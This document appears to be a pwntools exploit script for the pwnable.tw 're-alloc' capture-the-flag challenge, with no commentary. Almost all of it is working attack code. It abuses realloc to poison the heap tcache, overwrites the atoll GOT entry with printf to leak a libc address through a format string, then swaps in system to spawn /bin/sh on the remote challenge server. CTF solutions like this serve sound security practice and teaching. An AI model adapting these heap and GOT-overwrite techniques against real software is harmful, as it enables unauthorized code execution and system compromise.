from pwn import *

locdbg=False

host='chall.pwnable.tw'
port=10106
filename='./re-alloc'
libcname='./libc-2.29.so'
elf=ELF(filename)

if locdbg:
    p=process(filename)
    libc=ELF('/home/xieq/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc.so.6')
    context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    context.log_level='debug'

def pwndbg():
    if locdbg:
        gdb.attach(p)

def alc(idx,sz,ctt):
    p.recvuntil(b'choice: ')
    p.sendline(b'1')
    sleep(0.5)
    p.recvuntil(b'Index:')
    p.sendline(str(idx).encode())
    sleep(0.5)
    p.recvuntil(b'Size:')
    p.sendline(str(sz).encode())
    sleep(0.5)
    p.recvuntil(b'Data:')
    p.send(ctt)
    sleep(0.5)

def alc2(idx,sz,ctt):
    p.recvuntil(b'choice: ')
    p.sendline(b'1')
    sleep(0.5)
    p.recvuntil(b'Index:')
    p.send(b'@'*idx+b'\0')
    sleep(0.5)
    p.recvuntil(b'Size:')
    p.send(b'@'*sz+b'\0')
    sleep(0.5)
    p.recvuntil(b'Data:')
    p.send(ctt)
    sleep(0.5)

def ralc(idx,sz,ctt):
    p.recvuntil(b'choice: ')
    p.sendline(b'2')
    sleep(0.5)
    p.recvuntil(b'Index:')
    p.sendline(str(idx).encode())
    sleep(0.5)
    p.recvuntil(b'Size:')
    p.sendline(str(sz).encode())
    sleep(0.5)
    if(sz):
        p.recvuntil(b'Data:')
        p.send(ctt)
        sleep(0.5)

def fr(idx):
    p.recvuntil(b'choice: ')
    p.sendline(b'3')
    sleep(0.5)
    p.recvuntil(b'Index:')
    p.sendline(idx)
    sleep(0.5)

alc(0,0x18,'test')
ralc(0,0,'')
ralc(0,0x18,p64(elf.got['atoll']))
alc(1,0x18,'testtest')
ralc(0,0x28,'testtest')
fr(b'0')
ralc(1,0x28,'testtesttrashsss')
fr(b'1')

alc(0,0x38,'test')
ralc(0,0,'')
ralc(0,0x38,p64(elf.got['atoll']))
alc(1,0x38,'testtest')
ralc(0,0x48,'testtest')
fr(b'0')
ralc(1,0x48,'testtesttrashsss')
fr(b'1')

alc(0,0x38,p64(elf.plt['printf']))
'''print('Stack leaking:')
#pwndbg()

for i in range(1,30):
    fr(b'%'+str(i).encode()+b'$lld ')
    s=int(p.recvuntil(' '))
    print(str(i)+': '+hex(s))
'''
fr(b'%'+str(21).encode()+b'$lld ')
s=int(p.recvuntil(' '))
print(hex(s))
libc_start_main_addr=s-235
libc_base=libc_start_main_addr-libc.symbols['__libc_start_main']

print('libc base: '+hex(libc_base))

system_addr=libc_base+libc.symbols['system']
#pwndbg()
alc2(1,0x0f,p64(system_addr))

fr(b'/bin/sh\0')

p.interactive()

